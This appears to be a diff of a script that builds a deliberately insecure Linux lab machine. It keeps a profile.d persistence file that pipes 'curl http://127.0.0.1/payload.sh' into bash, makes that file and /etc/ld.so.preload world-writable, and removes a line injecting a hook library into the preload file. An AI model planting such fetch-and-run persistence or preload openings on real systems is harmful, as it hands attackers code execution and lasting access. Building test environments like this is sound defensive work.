@@ -90,8 +90,10 @@ curl -fsSL http://127.0.0.1/payload.sh | bash
 EOF
 chmod 0777 /etc/profile.d/zerox-persist.sh
 
+backup_file /etc/ld.so.preload
 touch /etc/ld.so.preload
-append_if_missing /etc/ld.so.preload "/tmp/libzeroxhook.so"
+# Keep the artifact writable but avoid injecting a missing preload library path,
+# which triggers noisy ld.so loader errors across normal command execution.
 chmod 0666 /etc/ld.so.preload || true
 
 echo "[INFO] Applying insecure kernel/network sysctl values..."
